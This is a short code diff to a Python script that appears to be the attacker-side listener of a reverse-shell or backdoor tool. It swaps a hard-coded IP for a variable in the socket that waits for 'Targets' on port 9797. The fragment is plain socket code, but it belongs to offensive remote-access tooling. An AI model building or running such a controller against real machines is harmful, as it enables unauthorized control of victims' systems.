@@ -108,9 +108,10 @@ def communication():
             result = reliable_receive()
             print(termcolor.colored(result, 'green'))
 
+IP_ADDRESS = ''
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
-sock.bind(('192.168.0.105', 9797)) #change IP Address here
+sock.bind((IP_ADDRESS, 9797)) #change IP Address here
 print(termcolor.colored('[+] Port Listening for Targets....', 'yellow'))
 sock.listen(5)
 target, ip = sock.accept()
